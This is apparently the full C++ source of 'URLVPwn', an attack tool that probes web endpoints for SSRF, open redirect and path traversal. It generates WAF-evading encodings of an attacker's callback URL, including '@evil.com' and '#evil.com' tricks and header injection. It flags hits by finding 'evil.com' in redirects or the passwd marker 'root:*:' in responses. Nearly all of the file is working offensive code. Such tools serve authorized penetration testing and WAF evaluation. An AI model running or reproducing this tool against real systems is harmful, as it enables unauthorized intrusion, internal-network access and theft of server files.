/*
URLVPwn v1.1
AUTHOR: c0d3Ninja
Website: https://gotr00t0day.github.io
Instagram: @gotr00t0day

DESCRIPTION:
A URL validation bypass testing tool designed to evaluate WAF defenses on protected endpoints. 
It supports multiple attack classes, including SSRF, open redirects, and path traversal, 
and is inspired by PortSwigger’s URL Validation Bypass Cheat Sheet.

Features:
- Multiple attack classes: SSRF, open redirects, and path traversal
- Advanced WAF Bypass Techniques
- Custom HTTP Header Injection For Callback URL
*/

#define CPPHTTPLIB_OPENSSL_SUPPORT
#include <ostream>
#include <unordered_map>
#include <iostream>
#include <fstream>
#include <string>
#include <cstdlib>
#include <sstream>
#include <iomanip>
#include <cctype>
#include "../includes/httplib.h"

#define RESET   "\033[0m"
#define RED     "\033[31m"
#define GREEN   "\033[32m"
#define YELLOW  "\033[33m"
#define BLUE    "\033[34m"
#define MAGENTA "\033[35m"
#define CYAN    "\033[36m"
#define WHITE   "\033[37m"
#define BOLD    "\033[1m"
#define UNDERLINE "\033[4m"

// Detection constants
static const std::string EVIL_DOMAIN = "evil.com";
static const std::string PASSWD_MARKER = "root:*:";
static const std::string LOCALHOST_MARKER = "localhost";

void validateURL (const std::string& urls, const std::string& payload) {
    bool useSSL = false;
    std::string originalUrl = urls;
    std::string host;
    
    if (urls.find("https://") == 0) {
        host = urls.substr(8);
        useSSL = true;
    } 
    else if (urls.find("http://") == 0) {
        host = urls.substr(7);
        useSSL = false;
    } else {
        std::cerr << RED << "[-] Invalid URL format: " << urls << RESET << std::endl;
        return;
    }
    
    size_t pathPos = host.find('/');
    std::string hostname = (pathPos != std::string::npos) ? host.substr(0, pathPos) : host;
    std::string path = (pathPos != std::string::npos) ? host.substr(pathPos) : "/";
    
    if (useSSL) {
        httplib::SSLClient sslCli(hostname.c_str());
        sslCli.set_connection_timeout(5, 0);
        sslCli.set_read_timeout(10, 0);
        sslCli.set_follow_location(true);
        if (auto res = sslCli.Get(path.c_str())) {
            if (payload == "openredirect") {
                if (res->status == 301 || res->status == 302 || res->status == 303 || res->status == 307 || res->status == 308) {
                    const std::string &body = res->body;
                    auto it = res->headers.find("Location");
                    if (it != res->headers.end()) {
                        const std::string &loc = it->second;
                        if (loc.find(EVIL_DOMAIN) != std::string::npos && body.find(EVIL_DOMAIN) != std::string::npos) {
                            std::cout << GREEN << "[+] " << originalUrl << std::endl;
                        } else {
                            std::cout << RED << "[-] " << originalUrl << std::endl;
                        }
                    } else {
                        std::cout << RED << "[-] " << originalUrl << std::endl;
                    }
                } else {
                    std::cout << RED << "[-] " << originalUrl << std::endl;
                }
            } else if (payload == "pathtraversal") {
                const std::string &body = res->body;
                if (res->status == 200 && (body.find(PASSWD_MARKER) != std::string::npos || body.find(LOCALHOST_MARKER) != std::string::npos)) {
                    std::cout << GREEN << "[+] " << originalUrl << std::endl;
                } else {
                    std::cout << RED << "[-] " << originalUrl << std::endl;
                }
            } else if (payload == "ssrf") {
                if (res->status == 200) {
                    std::cout << GREEN << "[+] " << originalUrl << std::endl;
                } else {
                    std::cout << RED << "[-] " << originalUrl << std::endl;
                }
            }
        } else {
            const auto err = sslCli.Get(path.c_str()).error();
            switch (err) {
                case httplib::Error::SSLConnection:
                    std::cout << RED << "[-] " << originalUrl << " - SSL connection failed" << RESET << std::endl;
                    break;
                case httplib::Error::ConnectionTimeout:
                    std::cout << RED << "[-] " << originalUrl << " - Connection timed out" << RESET << std::endl;
                    break;
                case httplib::Error::Connection:
                    std::cout << RED << "[-] " << originalUrl << " - Connection failed" << RESET << std::endl;
                    break;
                case httplib::Error::SSLServerVerification:
                    std::cout << RED << "[-] " << originalUrl << " - SSL server verification failed" << RESET << std::endl;
                    break;
                default:
                    std::cout << RED << "[-] " << originalUrl << " - Connection failed (Error: " << static_cast<int>(err) << ")" << RESET << std::endl;
                    break;
            }
        }
    } else {
        httplib::Client cli(hostname.c_str());
        cli.set_connection_timeout(5, 0);
        cli.set_read_timeout(10, 0);
        cli.set_follow_location(true);
        if (auto res = cli.Get(path.c_str())) {
            if (payload == "openredirect") {
                if (res->status == 301 || res->status == 302 || res->status == 303 || res->status == 307 || res->status == 308) {
                    const std::string &body = res->body;
                    auto it = res->headers.find("Location");
                    if (it != res->headers.end()) {
                        const std::string &loc = it->second;
                        if (loc.find(EVIL_DOMAIN) != std::string::npos && body.find(EVIL_DOMAIN) != std::string::npos) {
                            std::cout << GREEN << "[+] " << originalUrl << std::endl;
                        } else {
                            std::cout << RED << "[-] " << originalUrl << std::endl;
                        }
                    } else {
                        std::cout << RED << "[-] " << originalUrl << std::endl;
                    }
                } else {
                    std::cout << RED << "[-] " << originalUrl << std::endl;
                }
            } else if (payload == "pathtraversal") {
                const std::string &body = res->body;
                if (res->status == 200 && (body.find(PASSWD_MARKER) != std::string::npos || body.find(LOCALHOST_MARKER) != std::string::npos)) {
                    std::cout << GREEN << "[+] " << originalUrl << std::endl;
                } else {
                    std::cout << RED << "[-] " << originalUrl << std::endl;
                }
            } else if (payload == "ssrf") {
                if (res->status == 200) {
                    std::cout << GREEN << "[+] " << originalUrl << std::endl;
                } else {
                    std::cout << RED << "[-] " << originalUrl << std::endl;
                }
            }
        } else {
            const auto err = cli.Get(path.c_str()).error();
            switch (err) {
                case httplib::Error::ConnectionTimeout:
                    std::cout << RED << "[-] " << originalUrl << " - Connection timed out" << RESET << std::endl;
                    break;
                case httplib::Error::Connection:
                    std::cout << RED << "[-] " << originalUrl << " - Connection failed" << RESET << std::endl;
                    break;
                default:
                    std::cout << RED << "[-] " << originalUrl << " - Connection failed (Error: " << static_cast<int>(err) << ")" << RESET << std::endl;
                    break;
            }
        }
    }
}

std::vector<std::string> getPayloads (const std::string& file) {
    std::vector<std::string> payloads;
    std::fstream checkFile(file);
    if (!checkFile) {
        std::cerr << "File not found!" << "\n";
        return payloads;
    }
    std::string line;
    while(std::getline(checkFile, line)) {
        if (!line.empty()) {
            payloads.emplace_back(line);
        }
    }
    return payloads;
}

std::string urlEncode(const std::string& url) {
    std::ostringstream encoded;
    encoded.fill('0');
    encoded << std::hex << std::uppercase;

    for (unsigned char c : url) {
        if (std::isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~') {
            encoded << static_cast<char>(c);
        } else {
            encoded << '%' << std::setw(2) << static_cast<int>(c);
        }
    }

    return encoded.str();
}

std::string doubleUrlEncode(const std::string& url) {
    std::string firstEncode = urlEncode(url);
    return urlEncode(firstEncode);
}

std::string hexEncode(const std::string& url) {
    std::ostringstream encoded;
    encoded << std::hex << std::uppercase;
    
    for (unsigned char c : url) {
        if (std::isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~' || 
            c == ':' || c == '/' || c == '?' || c == '#' || c == '@') {
            encoded << static_cast<char>(c);
        } else {
            encoded << "%" << std::setfill('0') << std::setw(2) << static_cast<int>(c);
        }
    }
    
    return encoded.str();
}

std::string octalEncode(const std::string& url) {
    std::ostringstream encoded;
    
    for (unsigned char c : url) {
        if (std::isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~' || 
            c == ':' || c == '/' || c == '?' || c == '#' || c == '@') {
            encoded << static_cast<char>(c);
        } else {
            encoded << "%" << std::oct << static_cast<int>(c);
        }
    }
    
    return encoded.str();
}

std::string unicodeEncode(const std::string& url) {
    std::ostringstream encoded;
    
    for (unsigned char c : url) {
        if (std::isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~' || 
            c == ':' || c == '/' || c == '?' || c == '#' || c == '@') {
            encoded << static_cast<char>(c);
        } else {
            encoded << "%u" << std::setfill('0') << std::setw(4) << std::hex << std::uppercase 
                    << static_cast<int>(c);
        }
    }
    
    return encoded.str();
}

std::string encodeDomainOnly(const std::string& url) {
    std::string result = url;
    
    size_t protocolEnd = result.find("://");
    if (protocolEnd != std::string::npos) {
        std::string protocol = result.substr(0, protocolEnd + 3);
        std::string rest = result.substr(protocolEnd + 3);
        
        size_t pathStart = rest.find('/');
        size_t queryStart = rest.find('?');
        size_t fragmentStart = rest.find('#');
        
        size_t domainEnd = rest.length();
        if (pathStart != std::string::npos) {
            domainEnd = pathStart;
        } else if (queryStart != std::string::npos) {
            domainEnd = queryStart;
        } else if (fragmentStart != std::string::npos) {
            domainEnd = fragmentStart;
        }
        
        std::string domain = rest.substr(0, domainEnd);
        std::string path = rest.substr(domainEnd);
        
        std::string encodedDomain = urlEncode(domain);
        result = protocol + encodedDomain + path;
    }
    
    return result;
}

std::string encodePathOnly(const std::string& url) {
    std::string result = url;
    
    size_t protocolEnd = result.find("://");
    if (protocolEnd != std::string::npos) {
        std::string protocol = result.substr(0, protocolEnd + 3);
        std::string rest = result.substr(protocolEnd + 3);
        
        size_t pathStart = rest.find('/');
        if (pathStart != std::string::npos) {
            std::string domain = rest.substr(0, pathStart);
            std::string path = rest.substr(pathStart);
            
            std::string encodedPath = urlEncode(path);
            result = protocol + domain + encodedPath;
        }
    }
    
    return result;
}

std::string encodeDotsOnly(const std::string& url) {
    std::string result = url;
    
    size_t protocolEnd = result.find("://");
    if (protocolEnd != std::string::npos) {
        std::string protocol = result.substr(0, protocolEnd + 3);
        std::string rest = result.substr(protocolEnd + 3);
        
        size_t pathStart = rest.find('/');
        size_t queryStart = rest.find('?');
        size_t fragmentStart = rest.find('#');
        
        size_t domainEnd = rest.length();
        if (pathStart != std::string::npos) {
            domainEnd = pathStart;
        } else if (queryStart != std::string::npos) {
            domainEnd = queryStart;
        } else if (fragmentStart != std::string::npos) {
            domainEnd = fragmentStart;
        }
        
        std::string domain = rest.substr(0, domainEnd);
        std::string path = rest.substr(domainEnd);
        
        std::string encodedDomain = domain;
        size_t pos = 0;
        while ((pos = encodedDomain.find('.', pos)) != std::string::npos) {
            encodedDomain.replace(pos, 1, "%2E");
            pos += 3;
        }
        
        result = protocol + encodedDomain + path;
    }
    
    return result;
}

std::string tripleUrlEncode(const std::string& url) {
    std::string first = urlEncode(url);
    std::string second = urlEncode(first);
    return urlEncode(second);
}

std::string addAtBypass(const std::string& url) {
    std::string result = url;
    
    size_t protocolEnd = result.find("://");
    if (protocolEnd != std::string::npos) {
        std::string protocol = result.substr(0, protocolEnd + 3);
        std::string rest = result.substr(protocolEnd + 3);
        
        size_t pathStart = rest.find('/');
        std::string host = (pathStart != std::string::npos) ? rest.substr(0, pathStart) : rest;
        std::string path = (pathStart != std::string::npos) ? rest.substr(pathStart) : "";
        
        if (host.find('@') == std::string::npos) {
            result = protocol + EVIL_DOMAIN + "@" + host + path;
        }
    }
    
    return result;
}

std::string addHashBypass(const std::string& url) {
    std::string result = url;
    
    if (result.find('#') == std::string::npos) {
        size_t protocolEnd = result.find("://");
        if (protocolEnd != std::string::npos) {
            size_t pathStart = result.find('/', protocolEnd + 3);
            if (pathStart != std::string::npos) {
                result.insert(pathStart, "#" + EVIL_DOMAIN);
            } else {
                result += "#" + EVIL_DOMAIN;
            }
        }
    }
    
    return result;
}

std::string mixedEncoding(const std::string& url) {
    std::string result = url;
    
    size_t protocolEnd = result.find("://");
    if (protocolEnd != std::string::npos) {
        std::string protocol = result.substr(0, protocolEnd + 3);
        std::string rest = result.substr(protocolEnd + 3);
        
        std::string encodedRest = urlEncode(rest);
        result = protocol + encodedRest;
    } else {
        result = urlEncode(result);
    }
    
    return result;
}

void sendSSRFWithHeader(const std::string& targetUrl, const std::string& headerName, const std::string& headerValue) {
    bool useSSL = false;
    std::string host;
    
    if (targetUrl.find("https://") == 0) {
        host = targetUrl.substr(8);
        useSSL = true;
    } 
    else if (targetUrl.find("http://") == 0) {
        host = targetUrl.substr(7);
        useSSL = false;
    } else {
        std::cerr << RED << "[-] Invalid URL format: " << targetUrl << RESET << std::endl;
        return;
    }
    
    size_t pathPos = host.find('/');
    std::string hostname = (pathPos != std::string::npos) ? host.substr(0, pathPos) : host;
    std::string path = (pathPos != std::string::npos) ? host.substr(pathPos) : "/";
    
    httplib::Headers headers;
    headers.insert(std::make_pair(headerName, headerValue));
    
    std::cout << YELLOW << "[*] " << RESET << "Sending SSRF request with custom header:" << std::endl;
    std::cout << "    Target URL: " << GREEN << targetUrl << RESET << std::endl;
    std::cout << "    Hostname: " << CYAN << hostname << RESET << std::endl;
    std::cout << "    Path: " << CYAN << path << RESET << std::endl;
    std::cout << "    Header: " << CYAN << headerName << RESET << ": " << GREEN << headerValue << RESET << std::endl;
    std::cout << YELLOW << "[*] " << RESET << "Request details:" << std::endl;
    std::cout << "    Method: GET" << std::endl;
    std::cout << "    Protocol: " << (useSSL ? "HTTPS" : "HTTP") << std::endl;
    
    if (useSSL) {
        httplib::SSLClient sslCli(hostname.c_str());
        sslCli.set_connection_timeout(5, 0);
        sslCli.set_read_timeout(10, 0);
        sslCli.set_follow_location(true);
        
        auto result = sslCli.Get(path.c_str(), headers);
        if (result) {
            std::cout << GREEN << "[+] " << RESET << "Request sent successfully!" << std::endl;
            std::cout << "    Status Code: " << GREEN << result->status << RESET << std::endl;
            std::cout << YELLOW << "[*] " << RESET << "Check your callback server: " << GREEN << headerValue << RESET << std::endl;
        } else {
            auto err = result.error();
            std::cout << RED << "[-] Request failed!" << RESET << std::endl;
            switch (err) {
                case httplib::Error::SSLConnection:
                    std::cout << RED << "    Error: SSL connection failed" << RESET << std::endl;
                    break;
                case httplib::Error::ConnectionTimeout:
                    std::cout << RED << "    Error: Connection timed out" << RESET << std::endl;
                    break;
                case httplib::Error::Connection:
                    std::cout << RED << "    Error: Connection failed" << RESET << std::endl;
                    break;
                case httplib::Error::SSLServerVerification:
                    std::cout << RED << "    Error: SSL server verification failed" << RESET << std::endl;
                    break;
                default:
                    std::cout << RED << "    Error: Request failed (Error code: " << static_cast<int>(err) << ")" << RESET << std::endl;
                    break;
            }
        }
    } else {
        httplib::Client cli(hostname.c_str());
        cli.set_connection_timeout(5, 0);
        cli.set_read_timeout(10, 0);
        cli.set_follow_location(true);
        
        auto result = cli.Get(path.c_str(), headers);
        if (result) {
            std::cout << GREEN << "[+] " << RESET << "Request sent successfully!" << std::endl;
            std::cout << "    Status Code: " << GREEN << result->status << RESET << std::endl;
            std::cout << YELLOW << "[*] " << RESET << "Check your callback server: " << GREEN << headerValue << RESET << std::endl;
        } else {
            auto err = result.error();
            std::cout << RED << "[-] Request failed!" << RESET << std::endl;
            switch (err) {
                case httplib::Error::ConnectionTimeout:
                    std::cout << RED << "    Error: Connection timed out" << RESET << std::endl;
                    break;
                case httplib::Error::Connection:
                    std::cout << RED << "    Error: Connection failed" << RESET << std::endl;
                    break;
                default:
                    std::cout << RED << "    Error: Request failed (Error code: " << static_cast<int>(err) << ")" << RESET << std::endl;
                    break;
            }
        }
    }
}

void Resolve(const std::string& urls, const std::string& payloadType) {
    std::vector<std::string> payloads;
    if (payloadType == "ssrf") {
        std::string callback;
        std::cout << "Enter Callback link (https:// or http://): " << std::endl;
        std::cin >> callback;
        
        int encodeChoice;
        std::cout << CYAN << "[*] " << RESET << "WAF Bypass Encoding Options for Callback URL:" << std::endl;
        std::cout << "  1. No encoding (raw callback URL)" << std::endl;
        std::cout << "  2. URL encode (full callback)" << std::endl;
        std::cout << "  3. Double URL encode" << std::endl;
        std::cout << "  4. Triple URL encode" << std::endl;
        std::cout << "  5. Hex encode" << std::endl;
        std::cout << "  6. Octal encode" << std::endl;
        std::cout << "  7. Unicode encode" << std::endl;
        std::cout << "  8. Encode domain only (keep protocol & path)" << std::endl;
        std::cout << "  9. Encode path only (keep protocol & domain)" << std::endl;
        std::cout << " 10. Encode dots only (%2E in domain)" << std::endl;
        std::cout << " 11. @ bypass (evil.com@callback)" << std::endl;
        std::cout << " 12. # bypass (callback#evil.com)" << std::endl;
        std::cout << " 13. Mixed encoding" << std::endl;
        std::cout << " 14. Send callback in custom HTTP header" << std::endl;
        std::cout << "Enter choice (1-14): ";
        std::cin >> encodeChoice;
        
        std::string encodedCallback = callback;
        std::string encodingName = "No encoding";
        
        switch(encodeChoice) {
            case 1:
                encodedCallback = callback;
                encodingName = "Raw callback URL";
                break;
            case 2:
                encodedCallback = urlEncode(callback);
                encodingName = "URL encoded";
                break;
            case 3:
                encodedCallback = doubleUrlEncode(callback);
                encodingName = "Double URL encoded";
                break;
            case 4:
                encodedCallback = tripleUrlEncode(callback);
                encodingName = "Triple URL encoded";
                break;
            case 5:
                encodedCallback = hexEncode(callback);
                encodingName = "Hex encoded";
                break;
            case 6:
                encodedCallback = octalEncode(callback);
                encodingName = "Octal encoded";
                break;
            case 7:
                encodedCallback = unicodeEncode(callback);
                encodingName = "Unicode encoded";
                break;
            case 8:
                encodedCallback = encodeDomainOnly(callback);
                encodingName = "Domain only encoded";
                break;
            case 9:
                encodedCallback = encodePathOnly(callback);
                encodingName = "Path only encoded";
                break;
            case 10:
                encodedCallback = encodeDotsOnly(callback);
                encodingName = "Dots encoded (%2E)";
                break;
            case 11:
                encodedCallback = addAtBypass(callback);
                encodingName = "@ bypass";
                break;
            case 12:
                encodedCallback = addHashBypass(callback);
                encodingName = "# bypass";
                break;
            case 13:
                encodedCallback = mixedEncoding(callback);
                encodingName = "Mixed encoding";
                break;
            case 14: {
                std::string headerName;
                std::cout << "Enter HTTP header name (e.g., Referer, X-Forwarded-For, Origin): ";
                std::cin.ignore();
                std::getline(std::cin, headerName);
                
                if (headerName.empty()) {
                    headerName = "Referer";
                    std::cout << YELLOW << "[*] " << RESET << "Using default header: " << CYAN << headerName << RESET << std::endl;
                }
                
                int headerEncodeChoice;
                std::cout << CYAN << "[*] " << RESET << "Encode callback URL in header?" << std::endl;
                std::cout << "  1. No encoding" << std::endl;
                std::cout << "  2. URL encode" << std::endl;
                std::cout << "  3. Double URL encode" << std::endl;
                std::cout << "Enter choice (1-3): ";
                std::cin >> headerEncodeChoice;
                
                std::string headerValue = callback;
                if (headerEncodeChoice == 2) {
                    headerValue = urlEncode(callback);
                } else if (headerEncodeChoice == 3) {
                    headerValue = doubleUrlEncode(callback);
                }
                
                sendSSRFWithHeader(urls, headerName, headerValue);
                return;
            }
            default:
                std::cerr << RED << "[-] Invalid choice, using raw callback URL" << RESET << std::endl;
                encodedCallback = callback;
                break;
        }
        
        std::cout << YELLOW << "[*] " << RESET << encodingName << " callback: " << GREEN << encodedCallback << RESET << std::endl;
        
        std::string url = urls + encodedCallback;
        std::cout << YELLOW << "[*] " << RESET << "Sending SSRF request to callback URL: " << RESET << GREEN << callback << RESET << std::endl;
        validateURL(url, payloadType);
        std::cout << YELLOW << "[*] " << RESET << "Request sent, check your callback server: " << RESET << GREEN << url << RESET << std::endl;
        return;
    }
    else if (payloadType == "openredirect") {
        payloads = getPayloads("payloads/open_redirect_bypasses.txt");
    }
    else if (payloadType == "pathtraversal") {
        payloads = getPayloads("payloads/path_traversal_bypasses.txt");
    }
    else {
        std::cerr << "[-] Invalid payload type: " << payloadType << std::endl;
        std::cerr << "Valid types: ssrf, openredirect, pathtraversal" << std::endl;
        return;
    }
    
    if (payloads.empty()) {
        std::cerr << "[-] No payloads loaded or file not found!" << std::endl;
        return;
    }
    
    std::cout << "[*] Testing " << YELLOW << payloads.size() << WHITE << " payloads against " << GREEN << urls << RESET << std::endl;
    for (const auto& payload : payloads) {
        std::string fullLink = urls;
        
        if (fullLink.find('=') != std::string::npos) {
            fullLink += payload;
        } else {
            if (fullLink.back() != '/' && payload.front() != '/') {
                fullLink += "/";
            }
            fullLink += payload;
        }
        validateURL(fullLink, payloadType);
    }
}
